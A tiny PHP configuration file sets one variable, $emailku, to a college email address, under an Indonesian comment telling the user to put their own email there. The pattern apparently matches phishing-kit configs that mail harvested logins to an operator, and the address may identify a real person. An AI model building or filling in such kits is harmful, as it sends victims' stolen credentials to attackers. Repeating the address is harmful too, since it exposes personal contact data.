<?php
$emailku = 'alk53487@hawkmail.hacc.edu'; // GANTI EMAIL KAMU DISINI
?>